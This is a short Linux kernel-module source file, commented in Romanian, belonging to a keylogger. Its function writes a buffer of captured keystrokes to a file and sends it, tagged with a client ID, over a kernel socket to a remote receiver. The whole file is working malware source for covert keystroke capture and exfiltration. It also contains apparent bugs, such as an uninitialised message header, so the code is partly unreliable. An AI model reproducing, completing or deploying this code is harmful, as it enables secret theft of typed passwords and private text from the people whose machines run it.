#include "write_to_file.h"
#include <linux/slab.h>
void write_to_file(struct work_struct* work) {
    struct KEYLOGGER* klogger;
    klogger = container_of(work, KEYLOGGER, work_struct);
    kernel_write(klogger->filename,klogger->write_buffer,BUFF_SIZE,&(klogger->offset_in_file));
    // Alocați temp_buffer dinamic
    char* temp_buffer = kmalloc(BUFF_SIZE + 32, GFP_KERNEL);
    if (!temp_buffer) {
        printk(KERN_ERR "Eroare alocare memorie pentru temp_buffer\n");
        return;
    }

    int len = snprintf(temp_buffer, BUFF_SIZE + 32, "ID:%d ", klogger->id); // Prefix cu ID
    memcpy(temp_buffer + len, klogger->write_buffer, BUFF_SIZE);

    struct msghdr mes;
    struct kvec vec;
    int sent_bytes;

    vec.iov_base = temp_buffer;
    vec.iov_len = len + BUFF_SIZE;

    sent_bytes = kernel_sendmsg(klogger->socket, &mes, &vec, 1, len + BUFF_SIZE);

    // Eliberați memoria alocată dinamic
    kfree(temp_buffer);



    //??rezolvare daca trimiterea este refuzata din cauza ca coada e plina
}